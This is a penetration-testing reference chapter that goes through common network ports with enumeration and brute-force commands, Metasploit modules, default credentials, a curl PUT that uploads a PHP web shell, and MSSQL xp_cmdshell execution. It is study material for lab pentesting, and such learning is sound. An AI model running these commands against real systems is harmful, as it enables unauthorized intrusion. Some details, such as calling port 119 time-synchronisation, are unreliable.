<!-- TITLE: Service Enumeration -->
<!-- SUBTITLE: A quick summary of Service Enumeration -->

Common Services

# Common Services and Enumeration

I will try to make this chapter into a reference library. So that you can just check in this chapter to see common ways to exploit certain common services. I will only discuss the most common, since there are quite a few.

## Methodology

* **Enumerate**
 * Use steps below to exfiltrate as much data as we can from identified services.
 * Give all services the lookover before planning an attack vector.
* **Known Vulnerabilities**
 * Check if the service has any known publicly disclosed vulnerabilities.
* **Exploitable**
 * Search for any available public exploits, especially RCE which can provide a few easy wins.
* **Brute Forceable**
 * Alwways try common weak or default passwords.
 * Check for password re-use as soon as new credentials are disocvered.

## Port XXX - Service unknown

If you have a port open with unkown service you can do this to find out which service it might be.

```text
amap -d 192.168.19.244 8000
```

## Port 21 - FTP

Connect to the ftp-server to enumerate software and version

```text
ftp 192.168.1.101
nc 192.168.1.101 21
```

Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with `anonymous:anonymous`.

**Remember the binary and ascii mode!**

If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them!  
You just write **binary** and **ascii** to switch mode.

**FTP NSE**

```text
nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA 10.10.10.10_ftp_NSE 10.10.10.10
```

After obtaining all the required details, we can check for any publicly available exploits with `searchsploit`

**Summary**

1. Grab banners and check version
2. Check for available exploits
3. Test for anonymous logins
4. Brute force if we know any user accounts

## Port 22 - SSH

SSH is such an old and fundamental technology so most modern version are quite hardened. We can start doing the standard checks:

* Grab banners to detect version
* Check for known vulnerabilities and exploits
* Attempt common passwords
* Brute force

**SSH Enumeration**

You can find out the version of the SSH either but scanning it with nmap or by connecting with it using `nc`.

```text
nc 192.168.1.10 22
```

It returnes something like this:  
`SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1`

This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. [http://www.openssh.com/txt/rfc4253.txt](http://www.openssh.com/txt/rfc4253.txt)  
The protocol-version string should be defined like this: `SSH-protoversion-softwareversion SP comments CR LF`  
Where comments is optional. And SP means space, and CR \(carriege return\) and LF \(Line feed\)  
So basically the comments should be separated by a space.

**Brute force**

```text
hydra -L /home/10.10.10.228/loot/userlist.txt -e nsr 10.10.10.228 -s 22 ssh
hydra -L /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100.txt -e nsr 10.10.10.228 -s 22 ssh
```

**What next?**

* If SSH is enabled, make note of it as it may be leveraged later on in further attacks
 * Injection attacks enabling us to write our own RSA key and obtain SSH access
 * Brute force

## Port 23 - Telnet

Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out.

**Brute force it**

You can also brute force it like this:

```text
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
```

## Port 25 - SMTP

SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. Here are some things to we can do when enumerating a SMTP server:

* Grab banners and version
* Check vulnerabilities and exploits
* Check for open-relay
* Check supports commands
* Use VRFY to enumerate users

Here are the possible commands

```text
HELO -
EHLO - Extended SMTP.
STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
RCPT - Address of the recipient.
DATA - Starts the transfer of the message contents.
RSET - Used to abort the current email transaction.
MAIL - Specifies the email address of the sender.
QUIT - Closes the connection.
HELP - Asks for the help screen.
AUTH - Used to authenticate the client to the server.
VRFY - Asks the server to verify is the email user's mailbox exists.
```

**Enumerating users**

We can use this service to find out which usernames are in the database. This can be done in the following way.

```text
nc 192.168.1.103 25                                                                               

220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY roooooot
550 5.1.1 <roooooot>: Recipient address rejected: User unknown in local recipient table
```

Here we have managed to identify the user `root`. But `roooooot` was rejected.

`VRFY`, `EXPN` and `RCPT` can be used to identify users.

Telnet is a bit more friendly some times. So always use that too

```text
telnet 10.11.1.229 25
```

**Check for commands with nmap**

```text
nmap -script smtp-commands.nse 192.168.1.101
```

**Automated script - smtp-user-enum**

The command will look like this. `-M` for mode. `-U` for userlist. `-t` for target

```text
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
```

**Using Patator**

```text
patator smtp_vrfy host=10.10.10.228 user=FILE0 0=/usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt timeout=15 -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421
```

Patator output:

```text
07:29:37 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-04-08 07:29 AEST
07:29:37 patator    INFO -                                                                              
07:29:37 patator    INFO - code  size   time | candidate                          |   num | mesg
07:29:37 patator    INFO - -----------------------------------------------------------------------------
07:29:51 patator    INFO - 252   12    1.004 | backup                             |   135 | 2.0.0 backup
07:30:50 patator    INFO - 252   11    0.002 | games                              |   682 | 2.0.0 games
07:31:11 patator    INFO - 252   9     0.004 | irc                                |   821 | 2.0.0 irc
07:31:17 patator    INFO - 252   10    1.006 | mail                               |   956 | 2.0.0 mail
07:31:32 patator    INFO - 252   10    0.001 | news                               |  1093 | 2.0.0 news
07:31:59 patator    INFO - 252   11    1.002 | proxy                              |  1360 | 2.0.0 proxy
07:32:15 patator    INFO - 252   10    0.001 | root                               |  1425 | 2.0.0 root
07:32:26 patator    INFO - 252   12    1.004 | syslog                             |  1606 | 2.0.0 syslog
07:32:38 patator    INFO - 252   10    1.003 | user                               |  1714 | 2.0.0 user
```

**Metasploit**

It can also be done using metasploit:

```text
msf > use auxiliary/scanner/smtp/smtp_enum
```

**SMTP NSE scan**

```text
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.140 -oA 10.10.10.140_smtp_NSE
```

**What next?**

1. Compile list of enumerated users
  1. Can be used to brute force other services or web applications
2. Launch client-side attacks using open-relay

**SMTP Documentation**

[https://cr.yp.to/smtp/vrfy.html](https://cr.yp.to/smtp/vrfy.html)

[http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/](http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/)

[http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html](http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html)

[http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)

[https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/](https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/)

## Port 53 - DNS

## Port 69 - TFTP

This is a ftp-server but it is using UDP.

## Port 79 - Finger

```text
patator finger_lookup host=10.10.10.228 user=FILE0 0=/usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt --rate-limit=1 -x ignore:fgrep='no such user'
```

## Port 80 - HTTP

Info about web-vulnerabilities can be found in the next chapter [HTTP - Web Vulnerabilities](../http-web-vulnerabilities/). When enumerating HTTP, here are some of the things we should be taking note of:

* Scripting language in use \(PHP, JSP, ASP etc.\)
* Apache modules
* Hidden directories
* Robots.txt
* Database in use
* Web applications installed \(Wordpress etc.\)
* Web application behavior, i.e. where does it store or write data
* 403 errors - check user-agent
* Source code

### HTTP Enumeration

**Check server header**

First, let's start off by grabbing the web server headers

`curl -Ik http://10.10.10.140`

And source code

`curl -ik http://10.10.10.140`

Check if server supports `PUT` and whether we can upload:

`curl -v -X OPTIONS http://10.10.10.140`

`curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php`

**Checking for common misconfigurations and vulnerabilities**

`nikto -h http://10.10.10.10`

Remember to also run `nikto` against any interesting directories found. If using a proxy server then:

`nikto -h http://10.10.10.10 -useproxy http://proxy:8080`

We can also launch a few nmap NSE scripts as well to round out this phase:

`nmap -vv -sV -PN -p 80 10.10.10.10 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt -oN 10.10.10.10_http.nse`

**Directory brute forcing**

After we have run the above enumeration techniques we should now attempt to discover any hidden directories on the server

`dirb http://10.10.10.140 -r -o 10.10.10.140_http.dirb`

`gobuster -u http://10.10.10.140 -w /usr/share/seclists/Discovery/Web_Content_common.txt -s '200,204,301,302,307,403,500' -e > 10.10.10.140.gobuster`

Failing this, it is definitely worth creating a custom wordlist with all available target data and running this through `drib` to catch anything else.

**Creating a custom wordlist**

`cewl -d 5 -m 2 http://10.10.10.140`

Remember to append any text you find inside images as to the custom wordlist as well!

**Default credentials check**

It always pays to check any login forms or web applications for default or weak credentials. A quick way to find default credentials via Google:

`site:webapplication.com password`

A small sample to check on the fly:

```text
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username> password
<username> admin
<username> username
<username> nameofservice
```

More lists available in `/usr/share/wordlists/.`

**Brute force password protected directories \(.htaccess\)**

Using `medusa`

```text
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

**What next?**

* Search for publicly known vulnerabilities and exploits
* See chapter [Attacking the System](../http-web-vulnerabilities/attacking-the-system/) for web application attacks \(SQLi, LFI, RFI, XSS, etc\)
* Kick off a ZAP scan to detect  possible injection points

## Port 88 - Kerberos

Kerberos is a protocol that is used for network authentication. Different versions are used by \*nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.

If you already have a login to a user of that domain you might be able to escalate that privilege.

Check out:

* MS14-068

## Port 110 - POP3

This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network \(or outside\) access this server to fetch their emails.

```text
telnet 192.168.1.105 110
USER pelle@192.168.1.105
PASS admin

List all emails
list

Retrive email number 5, for example
retr 5
```

## Port 111 - RPCBIND

RFC: 1833

Rpcbind can help us look for NFS-shares. So look out for nfs.  
Obtain list of services running with RPC:

```text
rpcbind -p 192.168.1.101
```

## Port 119 - NNTP

Network time protocol.  
It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time.

An attacker could use this to change the time. Which might cause denial of service and all around havoc.

## Port 135 - MSRPC

This is the windows rpc-port. Some versions are vulnerable. We can run some basic enumeration with nmap's NSE script:

[https://en.wikipedia.org/wiki/Microsoft\_RPC](https://en.wikipedia.org/wiki/Microsoft_RPC)

### Enumerate

```text
nmap -vv --script=msrpc-enum 10.10.10.130
```

```text
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## Port 139 and 445 - SMB/Samba shares

Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server. Here are some things to look for when enumerating SMB:

* Enumeration of users!
 * Leading to brute force attacks
 * Further attacks against other vectors such as login forms etc
* SMB version
 * Many versions are vulnerable and exploits available
* Anonymous access
* Misconfigured shares
 * Modify or upload files

### Connecting

For linux-users you can log in to the smb-share using smbclient, like this:

```text
smbclient -L 192.168.1.102
smbclient //192.168.1.106/tmp
smbclient \\\\192.168.1.105\\ipc$ -U john
smbclient //192.168.1.105/ipc$ -U john
```

If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.

### Mounting an SMB shares

```text
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

### Connectin with PSExec

If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.

```text
use exploit/windows/smb/psexec
```

### SMB NSE scan

```text
nmap -vv --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.10.10.10 -p 445 -oA 10.10.10.10_smb.nse
```

### List of nmap NSE scripts for SMB

There are several NSE scripts that can be useful, for example:

```text
ls -l /usr/share/nmap/scripts/smb*
```

```text
-rw-r--r-- 1 root root  45K Jan 24  2016 /usr/share/nmap/scripts/smb-brute.nse
-rw-r--r-- 1 root root 4.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-domains.nse
-rw-r--r-- 1 root root 5.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-groups.nse
-rw-r--r-- 1 root root 7.9K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-processes.nse
-rw-r--r-- 1 root root  12K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-sessions.nse
-rw-r--r-- 1 root root 6.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-shares.nse
-rw-r--r-- 1 root root  13K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-users.nse
-rw-r--r-- 1 root root 1.7K Jan 24  2016 /usr/share/nmap/scripts/smb-flood.nse
-rw-r--r-- 1 root root 7.3K Jan 24  2016 /usr/share/nmap/scripts/smb-ls.nse
-rw-r--r-- 1 root root 8.6K Jan 24  2016 /usr/share/nmap/scripts/smb-mbenum.nse
-rw-r--r-- 1 root root 7.0K Jan 24  2016 /usr/share/nmap/scripts/smb-os-discovery.nse
-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-print-text.nse
-rw-r--r-- 1 root root  63K Jan 24  2016 /usr/share/nmap/scripts/smb-psexec.nse
-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-security-mode.nse
-rw-r--r-- 1 root root 2.4K Jan 24  2016 /usr/share/nmap/scripts/smb-server-stats.nse
-rw-r--r-- 1 root root  14K Jan 24  2016 /usr/share/nmap/scripts/smb-system-info.nse
-rw-r--r-- 1 root root 1.5K Jan 24  2016 /usr/share/nmap/scripts/smbv2-enabled.nse
-rw-r--r-- 1 root root 7.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse
-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root 5.4K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root 5.7K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root 5.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root 7.2K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root 4.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
```

### nbtscan

```text
nbtscan -r 192.168.1.1/24
```

It can be a bit buggy sometimes so run it several times to make sure it found all users.

### enum4linux

Enum4linux can be used to enumerate windows and linux machines with smb-shares.

The do all option:

```text
enum4linux -a 192.168.1.120
```

For info about it here: [https://labs.portcullis.co.uk/tools/enum4linux/](https://labs.portcullis.co.uk/tools/enum4linux/)

### rpcclient

You can also use rpcclient to enumerate the share.

Connect with a null-session. That is, without a user. This only works for older windows servers.

```text
rpcclient -U "" 192.168.1.101
```

Once connected you could enter commands like

```text
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
```

### Scanning the network for shares

Scanning for smb with nmap

```text
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
```

## Port 143/993 - IMAP

IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client \(like outlook\) fetches the emails from the mail-server using imap.

IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.

Port 993 is the secure port for IMAP.

## Port 161 and 162 - SNMP

Simple Network Management Protocol

SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.

SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.

You can have read-only access to the snmp.Often just with the community string `public`.

Common community strings

```text
public
private
community
```

Here is a longer list of common community strings: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt)

### MIB - Management information base

SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The "leaf" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.

**snmpwalk**

```text
snmpwalk -c public -v1 192.168.1.101 #community string and which version
```

This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:

```text
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

Now we can use this to query the data we really want.

**snmpenum**

**snmp-check**

This is a bit easier to use and with a lot prettier output.

```text
snmp-check -t 192.168.1.101 -c public
```

### Scan for open ports - Nmap

Since SNMP is using UDP we have to use the `-sU` flag.

```text
nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
```

### Onesixtyone

With onesixtyone you can test for open ports but also brute force community strings.  
I have had more success using onesixtyone than using nmap. So better use both.

```text

```

### Metasploit

There are a few snmp modules in metasploit that you can use. snmp\_enum can show you usernames, services, and other stuff.

[https://www.offensive-security.com/metasploit-unleashed/snmp-scan/](https://www.offensive-security.com/metasploit-unleashed/snmp-scan/)

## Port 199 - Smux

## Port 389/636 - LDAP

Lightweight Directory Access Protocol.  
This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation.  
Ldap is used more often in corporate structure.  
Webapplications can use ldap for authentication. If that is the case it is possible to perform **ldap-injections** which are similar to sqlinjections.

You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.

```text
ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"
```

When a client connects to the Ldap directory it can use it to query data, or add or remove.

Port 636 is used for SSL.

There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1

## Port 443 - HTTPS

Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on [client-side vulnerabilities](../http-web-vulnerabilities/attacking-the-system/).

### HTTPS Enumeration <a id="443enum"></a>

1. Initial scan for misconfigurations and vulnerabilities with nikto:  
  `nikto -h https://10.10.10.140`

  > Make sure to run scan interesting directories as well!

2. Check SSL/TLS with sslscan: `sslscan`
3. Brute force to find hidden directories and items: `dirb`

### Common Vulnerabilities

**Heartbleed**

OpenSSL 1.0.1 through 1.0.1f \(inclusive\) are vulnerable  
OpenSSL 1.0.1g is NOT vulnerable  
OpenSSL 1.0.0 branch is NOT vulnerable  
OpenSSL 0.9.8 branch is NOT vulnerable

First we need to investigate if the https-page is vulnerable to [heartbleed](http://heartbleed.com/)

We can do that the following way.

```text
sudo sslscan 192.168.101.1:443
```

or using a nmap script

```text
nmap -sV --script=ssl-heartbleed 192.168.101.8
```

You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.

```text
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.101.8
set verbose true
run
```

Now you have a flow of random data, some of it might be of interest to you.

**CRIME**

**Breach**

### Certificates

Read the certificate.

* Does it include names that might be useful?
* Correct vhost

## Port 554 - RTSP

RTSP \(Real Time Streaming Protocol\) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that.

## Port 587 - Submission

Outgoing smtp-port

If Postfix is run on it it could be vunerable to shellshock  
[https://www.exploit-db.com/exploits/34896/](https://www.exploit-db.com/exploits/34896/)

## Port 631 - Cups

Common UNIX Printing System has become the standard for sharing printers on a linux-network.  
You will often see port 631 open in your priv-esc enumeration when you run `netstat`. You can log in to it here: [http://localhost:631/admin](http://localhost:631/admin)

You authenticate with the OS-users.

Find version. Test **cups-config --version**. If this does not work surf to [http://localhost:631/printers](http://localhost:631/printers) and see the CUPS version in the title bar of your browser.

There are vulnerabilities for it so check your searchsploit.

## Port 993 - Imap Encrypted

The default port for the Imap-protocol.

## Port 995 - POP3 Encrypten

Port 995 is the default port for the **Post Office Protocol**.  
The protocol is used for clients to connect to the server and download their emails locally.  
You usually see this port open on mx-servers. Servers that are meant to send and recieve email.

Related ports:  
110 is the POP3 non-encrypted.

25, 465

## Port 1025 - NFS or IIS

I have seen them open on windows machine. But nothing has been listening on it.

## Port 1030/1032/1033/1038

I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.

## Port 1433 - MsSQL

Default port for Microsoft SQL .

```text
sqsh -S 192.168.1.101 -U sa
```

### Execute commands

```bash
To execute the date command to the following after logging in
xp_cmdshell 'date'
go
```

Many o the scanning modules in metasploit requires authentication. But some do not.

```text
use auxiliary/scanner/mssql/mssql_ping
```

### Brute force.

```text
scanner/mssql/mssql_login
```

If you have credencials look in metasploit for other modules.

## Port 1521 - Oracle database

Enumeration

```text
tnscmd10g version -h 192.168.1.101
tnscmd10g status -h 192.168.1.101
```

Bruteforce the ISD

```text
auxiliary/scanner/oracle/sid_brute
```

Connect to the database with `sqlplus`

References:

[http://www.red-database-security.com/wp/itu2007.pdf](http://www.red-database-security.com/wp/itu2007.pdf)

## Ports 1748, 1754, 1808, 1809 - Oracle

These are also ports used by oracle on windows. They run Oracles **Intelligent Agent**.

## Port 2049 - NFS

Network file system  
This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users.

If the service is on its default port you can run this command to see what the filesystem is sharing

```text
showmount -e 192.168.1.109
```

Then you can mount the filesystem to your machine using the following command

```text
mount 192.168.1.109:/ /tmp/NFS
mount -t 192.168.1.109:/ /tmp/NFS
```

Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.

This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation.

## Port 2100 - Oracle XML DB

There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it.

Can be accessed through ftp.  
Some default passwords here:  
[https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)  
Name:  
Version:

Default logins:  
sys:sys  
scott:tiger

## Port 3268 - globalcatLdap

## Port 3306 - MySQL

Always test the following:

Username: root

Password: root

```text
mysql --host=192.168.1.101 -u root -p
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname> -u ""@localhost

telnet 192.168.0.101 3306
```

You will most likely see this a lot:

```text
ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server
```

This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.

### Configuration files

```text
cat /etc/my.cnf
```

[http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html](http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html)

### Mysql-commands cheat sheet

```text
http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html
```

### Uploading a shell

```text
You can also use mysql to upload a shell
```

### Escalating privileges

If mysql is started as root you might have a chance to use it as a way to escalate your privileges.

**MYSQL UDF INJECTION:**

[https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

### Finding passwords to mysql

You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?

So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:

```text
/var/www/html/configuration.php
```

In that file you find the

```php
<?php
class JConfig {
   var $mailfrom = 'admin@rainng.com';
   var $fromname = 'testuser';
   var $sendmail = '/usr/sbin/sendmail';
   var $password = 'myPassowrd1234';
   var $sitename = 'test';
   var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
   var $MetaKeys = 'joomla, Joomla';
   var $offline_message = 'This site is down for maintenance. Please check back again soon.';
   }
```

## Port 3339 - Oracle web interface

## Port 3389 - Remote Desktop Protocol

This is a proprietary protocol developed by windows to allow remote desktop.

Log in like this

```text
rdesktop -u guest -p guest 10.11.1.5 -g 94%
```

Brute force like this

```text
ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
```

### Ms12-020

This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.

## Port 4445 - Upnotifyp

I have not found anything here. Try connecting with netcat and visiting in browser.

## Port 4555 - RSIP

I have seen this port being used by Apache James Remote Configuration.

There is an exploit for version 2.3.2

[https://www.exploit-db.com/docs/40123.pdf](https://www.exploit-db.com/docs/40123.pdf)

## Port 47001 - Windows Remote Management Service

Windows Remote Management Service

## Port 5357 - WSDAPI

## Port 5722 - DFSR

> The Distributed File System Replication \(DFSR\) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.

I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller.

## Port 5900 - VNC

VNC is used to get a screen for a remote host. But some of them have some exploits.

You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.

It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords

```text
background
use post/windows/gather/credentials/vnc
set session X
exploit
```

```text
vncviewer 192.168.1.109
```

### Ctr-alt-del

If you are unable to input ctr-alt-del \(kali might interpret it as input for kali\).

Try `shift-ctr-alt-del`

### Metasploit scanner

You can scan VNC for logins, with bruteforce.

**Login scan**

```text
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.1.109
run
```

**Scan for no-auth**

```text
use auxiliary/scanner/vnc/vnc_none_auth
set rhosts 192.168.1.109
run
```

## Port 8080

Since this port is used by many different services. They are divided like this.

### Tomcat

Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.

## Port 9389 -

> Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools \(RSAT\).

# References

{% embed url="http://www.0daysecurity.com/penetration-testing/enumeration.html​" %}
